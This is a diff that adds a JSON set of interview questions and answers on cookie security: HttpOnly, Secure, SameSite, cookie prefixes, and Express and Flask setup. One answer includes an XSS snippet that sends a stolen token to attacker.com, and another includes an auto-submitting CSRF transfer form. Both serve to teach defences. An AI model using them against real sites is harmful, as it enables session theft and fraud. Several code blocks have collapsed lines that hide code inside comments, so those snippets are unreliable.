@@ -1,0 +1,168 @@
+{
+  "topicId": "cookie-security",
+  "name": "Cookie Security",
+  "source": "Cookie Security/HttpOnly and Secure Cookies Interview Questions &.md",
+  "prompts": [
+    {
+      "id": "paa60ab0ab9be4b",
+      "cluster": "Fundamental Questions",
+      "title": "What is the HttpOnly attribute and what does it protect against?",
+      "seconds": 120,
+      "answerMarkdown": "The\u00a0`HttpOnly`\u00a0attribute is a cookie security flag that prevents client-side JavaScript from accessing the cookie through\u00a0`document.cookie`\u00a0or other DOM APIs.\n\n**What it protects against:**\n\n- \u2705\u00a0**XSS (Cross-Site Scripting) attacks**\u00a0- Prevents malicious scripts from stealing cookies\n- \u2705\u00a0**Cookie theft via JavaScript**\u00a0- Blocks access to sensitive cookie data\n\n**What it does NOT protect against:**\n\n- \u274c\u00a0**CSRF (Cross-Site Request Forgery) attacks**\u00a0- Browser still automatically sends cookies with requests\n- \u274c\u00a0**Man-in-the-Middle attacks**\u00a0- Does not encrypt or secure transmission\n- \u274c\u00a0**Server-side vulnerabilities**\u00a0- Only affects client-side access\n\n**Example:**\n\n```jsx\n// Without HttpOnly (vulnerable)Set-Cookie: sessionId=abc123\n// JavaScript can access: document.cookie includes sessionId// With HttpOnly (protected)Set-Cookie: sessionId=abc123; HttpOnly\n// JavaScript cannot access: document.cookie does NOT include sessionId\n```\n\n---"
+    },
+    {
+      "id": "p4979bcf8edfbaf",
+      "cluster": "Fundamental Questions",
+      "title": "What is the Secure attribute and why is it important?",
+      "seconds": 120,
+      "answerMarkdown": "The\u00a0`Secure`\u00a0attribute ensures cookies are only transmitted over HTTPS connections. Browsers will refuse to send\u00a0`Secure`\u00a0cookies over unencrypted HTTP connections.\n\n**Why it's important:**\n\n- Prevents cookie interception over insecure networks\n- Protects against Man-in-the-Middle (MitM) attacks\n- Required for\u00a0`SameSite=None`\u00a0cookies in modern browsers\n- Essential for protecting sensitive data in transit\n\n**Important notes:**\n\n- `Secure`\u00a0does NOT encrypt the cookie value itself\n- Relies on HTTPS/TLS for encryption\n- Cookies without\u00a0`Secure`\u00a0can be intercepted over HTTP\n\n**Example:**\n\n```jsx\n// Without Secure (vulnerable)Set-Cookie: sessionId=abc123\n// Sent over HTTP in plaintext - can be intercepted// With Secure (protected)Set-Cookie: sessionId=abc123; Secure\n// Only sent over HTTPS - encrypted transmission\n```\n\n---"
+    },
+    {
+      "id": "p9d9ccd42adc9e3",
+      "cluster": "Fundamental Questions",
+      "title": "Does HttpOnly protect against CSRF attacks?",
+      "seconds": 120,
+      "answerMarkdown": "**No, HttpOnly does NOT protect against CSRF attacks.**\n\nThis is a common misconception. HttpOnly only prevents JavaScript from accessing cookies, but CSRF attacks don't require JavaScript access to cookies.\n\n**How CSRF works:**\n\n1. User is logged into a website (has session cookie)\n2. User visits attacker's website\n3. Attacker's website submits a form to the target website\n4. Browser automatically includes the user's cookies with the request\n5. Target website processes the request with valid cookies\n6. Attack succeeds\n\n**Why HttpOnly doesn't help:**\n\n- CSRF attacks rely on the browser automatically sending cookies\n- HttpOnly only prevents JavaScript access, not automatic cookie sending\n- The browser still sends HttpOnly cookies with requests automatically\n\n**What actually protects against CSRF:**\n\n- `SameSite`\u00a0attribute (Strict or Lax)\n- CSRF tokens\n- Custom headers (e.g., X-Requested-With)\n- Double-submit cookies\n\n**Example:**\n\n```jsx\n// Cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly; Secure\n\n// CSRF attack still works:// Attacker's form on evil.com:\n<form action=\"https://bank.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\">\n  <input name=\"amount\" value=\"10000\">\n</form>\n\n// Browser automatically sends cookie:\nPOST https://bank.com/transfer HTTP/1.1\nCookie: sessionId=abc123  // Still sent automatically!\n\n// HttpOnly did NOT prevent this\n\n```\n\n---"
+    },
+    {
+      "id": "p1446fef4d51c60",
+      "cluster": "Fundamental Questions",
+      "title": "What is the SameSite attribute and how does it protect against CSRF?",
+      "seconds": 120,
+      "answerMarkdown": "The\u00a0`SameSite`\u00a0attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks.\n\n**Values:**\n\n1. **`SameSite=Strict`**: Cookie sent only with same-site requests\n    - Maximum CSRF protection\n    - Cookie NOT sent with any cross-site requests\n    - May require re-authentication when coming from external links\n2. **`SameSite=Lax`**\u00a0(default in modern browsers): Cookie sent with same-site requests and top-level GET navigations\n    - Good balance of security and usability\n    - Cookie NOT sent with cross-site POST requests\n    - Cookie IS sent when user clicks external link (GET navigation)\n3. **`SameSite=None`**: Cookie sent with both same-site and cross-site requests\n    - Requires\u00a0`Secure`\u00a0attribute\n    - No CSRF protection\n    - Used for third-party integrations\n\n**How it prevents CSRF:**\n\n```jsx\n// With SameSite=StrictSet-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly\n\n// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)// Browser refuses to send cookie// Attack fails - no cookie sent\n```\n\n---"
+    },
+    {
+      "id": "p6ae039c22e188b",
+      "cluster": "Fundamental Questions",
+      "title": "What are cookie prefixes (__Secure- and __Host-)?",
+      "seconds": 120,
+      "answerMarkdown": "Cookie prefixes provide additional security by enforcing constraints at the browser level.\n\n**`__Secure-`\u00a0prefix:**\n\n- Cookie name must start with\u00a0`__Secure-`\n- Must have\u00a0`Secure`\u00a0attribute\n- Must be set from HTTPS origin\n- Prevents accidental insecure cookie setting\n\n**`__Host-`\u00a0prefix:**\n\n- Cookie name must start with\u00a0`__Host-`\n- Must have\u00a0`Secure`\u00a0attribute\n- Must have\u00a0`Path=/`\n- Must NOT have\u00a0`Domain`\u00a0attribute\n- Must be set from HTTPS origin\n- Prevents subdomain cookie access\n- Maximum isolation\n\n**Example:**\n\n```jsx\n// __Secure- prefixSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly\n// Browser enforces Secure attribute// __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly\n// Browser enforces no Domain, Path=/, and Secure// Prevents subdomain.example.com from accessing cookie set by example.com\n```\n\n---"
+    },
+    {
+      "id": "p7509752e97bd10",
+      "cluster": "Scenario-Based Questions",
+      "title": "How would you configure cookies to prevent both XSS and CSRF attacks?",
+      "seconds": 120,
+      "answerMarkdown": "Use a combination of\u00a0`HttpOnly`,\u00a0`Secure`, and\u00a0`SameSite`\u00a0attributes:\n\n```jsx\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\n```\n\n**Breakdown:**\n\n- `HttpOnly`: Prevents JavaScript access (XSS protection)\n- `Secure`: HTTPS-only transmission\n- `SameSite=Strict`: Prevents cross-site cookie sending (CSRF protection)\n- `__Host-`\u00a0prefix: Additional security enforcement\n- `Path=/`: Site-wide availability\n- `Max-Age=3600`: 1-hour expiration\n\n**Alternative (more user-friendly):**\n\n```jsx\nSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600\n\n```\n\n- `SameSite=Lax`\u00a0provides CSRF protection while allowing external links to work\n\n---"
+    },
+    {
+      "id": "p6dd9eeaa61a53a",
+      "cluster": "Scenario-Based Questions",
+      "title": "A user reports that they get logged out when clicking links from email. What could be the cause?",
+      "seconds": 120,
+      "answerMarkdown": "This is likely caused by\u00a0`SameSite=Strict`\u00a0on the session cookie.\n\n**Explanation:**\n\n- `SameSite=Strict`\u00a0prevents cookies from being sent with ANY cross-site requests\n- When a user clicks a link from email (external site), the browser treats it as a cross-site navigation\n- The session cookie is not sent, so the user appears logged out\n\n**Solutions:**\n\n1. **Change to SameSite=Lax**\u00a0(recommended for most applications):\n\n    ```jsx\n    Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Lax\n\n    ```\n\n    - Still provides CSRF protection (blocks cross-site POST)\n    - Allows cookies with top-level GET navigations (external links work)\n2. **Keep Strict but implement proper redirects**:\n    - Email links go to a landing page first\n    - Landing page redirects to the actual destination\n    - Second navigation is same-site, so cookie is sent\n3. **Use separate cookies**:\n    - Strict cookie for sensitive operations\n    - Lax cookie for general session\n\n---"
+    },
+    {
+      "id": "pf5ca2c779c0ada",
+      "cluster": "Scenario-Based Questions",
+      "title": "Your application needs to work with third-party widgets. How do you configure cookies?",
+      "seconds": 120,
+      "answerMarkdown": "For third-party integrations, you need\u00a0`SameSite=None`\u00a0with\u00a0`Secure`:\n\n```jsx\nSet-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n\n```\n\n**Important considerations:**\n\n1. **`SameSite=None`\u00a0requires\u00a0`Secure`**: Modern browsers enforce this\n2. **No CSRF protection**:\u00a0`SameSite=None`\u00a0allows cross-site requests\n3. **Use CSRF tokens**: Implement additional CSRF protection\n4. **Browser compatibility**: Some browsers block third-party cookies by default\n5. **Alternative approaches**: Consider OAuth2, token-based auth, or iframe postMessage\n\n**Example:**\n\n```jsx\n// Widget cookie (allows cross-site)Set-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/\n\n// Main session cookie (same-site only)Set-Cookie: __Host-sessionId=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/\n\n```\n\n---"
+    },
+    {
+      "id": "p65cf172d2f7d78",
+      "cluster": "Scenario-Based Questions",
+      "title": "You discover that your session cookies are being sent over HTTP. What's wrong?",
+      "seconds": 120,
+      "answerMarkdown": "The cookies are missing the\u00a0`Secure`\u00a0attribute.\n\n**Problem:**\n\n```jsx\n// Vulnerable configurationSet-Cookie: sessionId=abc123; HttpOnly\n// Missing Secure attribute - sent over HTTP\n```\n\n**Solution:**\n\n```jsx\n// Secure configurationSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// Only sent over HTTPS\n```\n\n**Additional checks:**\n\n1. Ensure your application is served over HTTPS\n2. Check for mixed content (HTTP resources on HTTPS pages)\n3. Verify server configuration (some frameworks require explicit Secure setting)\n4. Use\u00a0`__Secure-`\u00a0prefix to enforce Secure attribute:\n\n    ```jsx\n    Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly\n    // Browser will reject if Secure is missing\n    ```\n\n---"
+    },
+    {
+      "id": "p3c56aeffebdb81",
+      "cluster": "Scenario-Based Questions",
+      "title": "An attacker successfully performs a CSRF attack even though your cookies have HttpOnly. Why?",
+      "seconds": 120,
+      "answerMarkdown": "HttpOnly does NOT protect against CSRF attacks. The attacker's CSRF attack succeeded because:\n\n1. **HttpOnly only prevents JavaScript access**\u00a0- It doesn't prevent the browser from automatically sending cookies with requests\n2. **CSRF doesn't need JavaScript**\u00a0- CSRF attacks work by tricking the browser into automatically including cookies\n3. **Missing SameSite attribute**\u00a0- Without\u00a0`SameSite`, cookies are sent with all requests, including cross-site requests\n\n**Vulnerable configuration:**\n\n```jsx\nSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// Missing SameSite - CSRF attack succeeds\n```\n\n**How the attack works:**\n\n```html\n<!-- Attacker's website: evil.com --><form action=\"https://bank.com/transfer\" method=\"POST\" id=\"csrf-form\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker-account\">\n  <input type=\"hidden\" name=\"amount\" value=\"10000\">\n</form>\n<script>document.getElementById('csrf-form').submit();</script>\n\n```\n\n```\nPOST https://bank.com/transfer HTTP/1.1\nHost: bank.com\nCookie: sessionId=abc123  // Browser automatically includes cookie\nContent-Type: application/x-www-form-urlencoded\n\nto=attacker-account&amount=10000\n\n```\n\n**Solution:**\n\n```jsx\n// Add SameSite attributeSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n// Or use SameSite=Lax for better UXSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n\n```\n\n---"
+    },
+    {
+      "id": "pbad2905d7f664a",
+      "cluster": "Scenario-Based Questions",
+      "title": "Your multi-tenant SaaS application has cookies accessible across subdomains. How do you fix this?",
+      "seconds": 120,
+      "answerMarkdown": "Use the\u00a0`__Host-`\u00a0prefix to prevent subdomain access:\n\n**Problem:**\n\n```jsx\n// Vulnerable - accessible to all subdomainsSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly\n// tenant1.example.com can access tenant2.example.com's cookies\n```\n\n**Solution:**\n\n```jsx\n// Secure - only accessible to exact hostSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/\n// tenant1.example.com cannot access tenant2.example.com's cookies\n```\n\n**Why\u00a0`__Host-`\u00a0prefix works:**\n\n- Requires\u00a0`Path=/`\n- Prohibits\u00a0`Domain`\u00a0attribute\n- Cookie is only accessible to the exact host that set it\n- Prevents subdomain cookie access\n\n**Alternative (if you need subdomain sharing):**\n\n```jsx\n// Only if you actually need subdomain sharingSet-Cookie: sessionId=abc123; Domain=.example.com; Secure; HttpOnly; SameSite=Lax\n// But ensure proper tenant isolation at application level\n```\n\n---"
+    },
+    {
+      "id": "p704c285d54ffde",
+      "cluster": "Scenario-Based Questions",
+      "title": "Your CSRF tokens are being stolen via XSS. How do you protect them?",
+      "seconds": 120,
+      "answerMarkdown": "Store CSRF tokens in HttpOnly cookies:\n\n**Vulnerable approach:**\n\n```jsx\n// CSRF token in regular cookie (accessible to JavaScript)Set-Cookie: csrf_token=abc123\n// XSS can steal it:\n<script>\n  var token = document.cookie.match(/csrf_token=([^;]+)/)[1];\n  fetch('https://attacker.com/steal?token=' + token);\n</script>\n\n```\n\n**Secure approach:**\n\n```jsx\n// CSRF token in HttpOnly cookieSet-Cookie: csrf_token=abc123; HttpOnly; Secure; SameSite=Strict\n\n// XSS cannot access it:\n<script>\n  console.log(document.cookie);// Does NOT include csrf_token// Token cannot be stolen\n</script>\n\n```\n\n**How CSRF tokens work with HttpOnly:**\n\n1. Server generates unique token for each session\n2. Token stored in HttpOnly cookie (prevents XSS theft)\n3. Token also embedded in forms (hidden input or meta tag)\n4. On form submission, server compares cookie token with form token\n5. If they match, request is legitimate\n6. If they don't match, request is rejected\n\n**Important note:**\n\n- HttpOnly on CSRF token prevents XSS from stealing it\n- But HttpOnly itself doesn't prevent CSRF - the token validation does\n- The token must be accessible to the form (via hidden input or meta tag)\n\n---"
+    },
+    {
+      "id": "paf660c6df859b9",
+      "cluster": "Implementation Questions",
+      "title": "How do you set secure cookies in Node.js/Express?",
+      "seconds": 120,
+      "answerMarkdown": "```jsx\nconst express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.post('/login', (req, res) => {\n  const sessionToken = generateSessionToken();\n\n  res.cookie('__Host-sessionId', sessionToken, {\n    secure: true,// HTTPS onlyhttpOnly: true,// No JavaScript accesssameSite: 'strict',// CSRF protectionpath: '/',// Site-widemaxAge: 3600000,// 1 hour (in milliseconds)// Note: __Host- prefix requires no domain option\n  });\n\n  res.json({ success: true });\n});\n\n```\n\n**Key points:**\n\n- Use\u00a0`secure: true`\u00a0for HTTPS-only\n- Use\u00a0`httpOnly: true`\u00a0for XSS protection\n- Use\u00a0`sameSite: 'strict'`\u00a0or\u00a0`'lax'`\u00a0for CSRF protection\n- Use\u00a0`__Host-`\u00a0prefix for maximum security (no domain option)\n- `maxAge`\u00a0is in milliseconds\n\n---"
+    },
+    {
+      "id": "pff33d27cb3fb13",
+      "cluster": "Implementation Questions",
+      "title": "How do you set secure cookies in Python/Flask?",
+      "seconds": 120,
+      "answerMarkdown": "```python\nfrom flask import Flask, make_response\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    session_token = generate_session_token()\n    response = make_response({'success': True})\n\n    response.set_cookie(\n        '__Host-sessionId',\n        value=session_token,\n        secure=True,# HTTPS only\n        httponly=True,# No JavaScript access\n        samesite='Strict',# CSRF protection\n        path='/',# Site-wide\n        max_age=3600,# 1 hour (in seconds)# Note: __Host- prefix requires no domain parameter\n    )\n\n    return response\n\n```\n\n**Key points:**\n\n- Use\u00a0`secure=True`\u00a0for HTTPS-only\n- Use\u00a0`httponly=True`\u00a0for XSS protection\n- Use\u00a0`samesite='Strict'`\u00a0or\u00a0`'Lax'`\u00a0for CSRF protection\n- `max_age`\u00a0is in seconds (not milliseconds)\n- No\u00a0`domain`\u00a0parameter for\u00a0`__Host-`\u00a0prefix\n\n---"
+    },
+    {
+      "id": "p283ae359e81220",
+      "cluster": "Implementation Questions",
+      "title": "How do you verify that cookies are set correctly?",
+      "seconds": 120,
+      "answerMarkdown": "Multiple ways to verify:\n\n**1. Browser DevTools:**\n\n```\n1. Open DevTools (F12)\n2. Go to Application/Storage tab (Chrome) or Storage tab (Firefox)\n3. Click Cookies\n4. View cookie attributes:\n   - HttpOnly: \u2713 (checkmark)\n   - Secure: \u2713 (checkmark)\n   - SameSite: Strict/Lax/None\n   - Path: /\n   - Expires: (date)\n\n```\n\n**2. Command line (curl):**\n\n```bash\n# Check Set-Cookie header\ncurl -I https://example.com/login\n\n# Response should show:\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/\n\n```\n\n**3. Browser Console:**\n\n```jsx\n// HttpOnly cookies should NOT appearconsole.log(document.cookie);\n// Should NOT include HttpOnly cookies// Check if cookie is sent with requests// Use Network tab in DevTools\n```\n\n**4. Online tools:**\n\n- SecurityHeaders.com\n- Cookie-Editor browser extension\n- Browser DevTools Network tab\n\n---"
+    },
+    {
+      "id": "pf5f4868e71f8c3",
+      "cluster": "Troubleshooting Questions",
+      "title": "Cookies are not being set. What could be wrong?",
+      "seconds": 120,
+      "answerMarkdown": "Common issues:\n\n**1. Missing Secure on HTTP:**\n\n```jsx\n// Problem: Secure cookie on HTTP connection// Browser will reject itSet-Cookie: sessionId=abc123; Secure\n// Solution: Use HTTPS or remove Secure (not recommended)\n```\n\n**2. Invalid SameSite=None without Secure:**\n\n```jsx\n// Problem: SameSite=None requires SecureSet-Cookie: sessionId=abc123; SameSite=None\n// Browser will reject it// Solution: Add Secure attributeSet-Cookie: sessionId=abc123; SameSite=None; Secure\n\n```\n\n**3. Invalid __Host- prefix usage:**\n\n```jsx\n// Problem: __Host- prefix with Domain attributeSet-Cookie: __Host-sessionId=abc123; Domain=example.com; Secure; Path=/\n// Browser will reject it// Solution: Remove Domain attributeSet-Cookie: __Host-sessionId=abc123; Secure; Path=/\n\n```\n\n**4. Path mismatch:**\n\n```jsx\n// Cookie set with Path=/apiSet-Cookie: sessionId=abc123; Path=/api\n// Cookie not sent with requests to /// Solution: Use Path=/ for site-wide cookies\n```\n\n**5. Domain mismatch:**\n\n```jsx\n// Cookie set for example.comSet-Cookie: sessionId=abc123; Domain=example.com\n// Cookie not sent to www.example.com (if Domain not set)// Or cookie sent to all subdomains (if Domain=.example.com)\n```\n\n---"
+    },
+    {
+      "id": "pca25cdbba2c2e4",
+      "cluster": "Troubleshooting Questions",
+      "title": "Users are getting logged out unexpectedly. What could cause this?",
+      "seconds": 120,
+      "answerMarkdown": "Common causes:\n\n**1. SameSite=Strict with external links:**\n\n```jsx\n// Problem: Cookie not sent with external link clicksSet-Cookie: sessionId=abc123; SameSite=Strict\n// Solution: Use SameSite=LaxSet-Cookie: sessionId=abc123; SameSite=Lax\n\n```\n\n**2. Cookie expiration:**\n\n```jsx\n// Problem: Short Max-AgeSet-Cookie: sessionId=abc123; Max-Age=300// 5 minutes// Solution: Increase Max-Age or implement refresh mechanismSet-Cookie: sessionId=abc123; Max-Age=3600// 1 hour\n```\n\n**3. Browser blocking third-party cookies:**\n\n```jsx\n// Problem: SameSite=None cookies blockedSet-Cookie: sessionId=abc123; SameSite=None; Secure\n// Some browsers block third-party cookies by default// Solution: Use alternative authentication (OAuth, tokens)\n```\n\n**4. Server-side session expiration:**\n\n- Check server-side session timeout\n- Implement session refresh mechanism\n- Check for session cleanup jobs\n\n---"
+    },
+    {
+      "id": "p919eb41e9dea4d",
+      "cluster": "Advanced Questions",
+      "title": "Explain the difference between HttpOnly, Secure, and SameSite attributes.",
+      "seconds": 120,
+      "answerMarkdown": "| Attribute | Protects Against | How It Works | When to Use |\n| --- | --- | --- | --- |\n| **HttpOnly** | XSS (cookie theft) | Prevents JavaScript access to cookies | Always for sensitive cookies |\n| **Secure** | MitM attacks | Ensures HTTPS-only transmission | Always in production |\n| **SameSite** | CSRF attacks | Controls cross-site cookie sending | Always (Strict or Lax) |\n\n**HttpOnly:**\n\n- Prevents\u00a0`document.cookie`\u00a0access\n- Protects against XSS cookie theft\n- Does NOT prevent CSRF\n\n**Secure:**\n\n- Requires HTTPS connection\n- Prevents interception over HTTP\n- Required for\u00a0`SameSite=None`\n\n**SameSite:**\n\n- Controls when cookies are sent\n- `Strict`: Same-site only\n- `Lax`: Same-site + top-level GET\n- `None`: All requests (requires Secure)\n\n**Best practice:**\n\n```jsx\nSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax\n// All three together provide comprehensive protection\n```\n\n---"
+    },
+    {
+      "id": "p9157ab1a2a42e6",
+      "cluster": "Advanced Questions",
+      "title": "How do you implement \"Remember Me\" functionality securely?",
+      "seconds": 120,
+      "answerMarkdown": "Use separate cookies with different lifespans:\n\n```jsx\n// Short-lived session cookieSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600\n\n// Long-lived remember me tokenSet-Cookie: __Secure-rememberToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=2592000\n\n```\n\n**Implementation:**\n\n1. User logs in and checks \"Remember Me\"\n2. Server generates two tokens:\n    - Session token (short-lived, e.g., 1 hour)\n    - Remember token (long-lived, e.g., 30 days)\n3. Both stored in HttpOnly, Secure cookies\n4. On each request:\n    - If session token valid: user is authenticated\n    - If session token expired but remember token valid: refresh session token\n    - If both expired: require re-authentication\n\n**Security considerations:**\n\n- Remember token should be cryptographically random\n- Store token hash on server (not plain token)\n- Implement token rotation on use\n- Allow users to revoke remember tokens\n- Monitor for suspicious activity\n\n---"
+    },
+    {
+      "id": "pda941bb4b85aa2",
+      "cluster": "Advanced Questions",
+      "title": "How do cookie security attributes work together in a defense-in-depth strategy?",
+      "seconds": 120,
+      "answerMarkdown": "Each attribute provides a different layer of protection:\n\n**Layer 1: HttpOnly (XSS Protection)**\n\n```jsx\nHttpOnly: Prevents JavaScript from stealing cookies\n\n```\n\n**Layer 2: Secure (Transmission Protection)**\n\n```jsx\nSecure: Ensures cookies only sent over HTTPS\n\n```\n\n**Layer 3: SameSite (CSRF Protection)**\n\n```jsx\nSameSite: Prevents cookies from being sent with cross-site requests\n\n```\n\n**Layer 4: Cookie Prefixes (Enforcement)**\n\n```jsx\n__Host- or __Secure-: Browser-level enforcement of security rules\n\n```\n\n**Layer 5: Short Expiration (Exposure Limitation)**\n\n```jsx\nMax-Age: Limits window of exposure if cookie is compromised\n\n```\n\n**Complete defense-in-depth:**\n\n```jsx\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\n```\n\n**Additional layers:**\n\n- Server-side session validation\n- IP address validation\n- User-Agent validation\n- Rate limiting\n- Anomaly detection\n- Regular token rotation\n\n**Why defense-in-depth matters:**\n\n- If one layer fails, others provide protection\n- No single security measure is perfect\n- Multiple layers make attacks more difficult\n- Provides redundancy and resilience\n\n---"
+    },
+    {
+      "id": "pecb3564d795ac1",
+      "cluster": "Quick Reference Answers",
+      "title": "What protects against CSRF?",
+      "seconds": 90,
+      "answerMarkdown": "SameSite attribute (Strict or Lax) or CSRF tokens"
+    },
+    {
+      "id": "pf01d7b8dd6e1d5",
+      "cluster": "Quick Reference Answers",
+      "title": "What is the recommended cookie configuration?",
+      "seconds": 90,
+      "answerMarkdown": "`__Secure-sessionId=token; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600`"
+    },
+    {
+      "id": "p7db03edca16c22",
+      "cluster": "Quick Reference Answers",
+      "title": "Does HttpOnly protect against CSRF?",
+      "seconds": 90,
+      "answerMarkdown": "No, HttpOnly only protects against XSS. Use SameSite or CSRF tokens for CSRF protection.\n\n---"
+    }
+  ]
+}
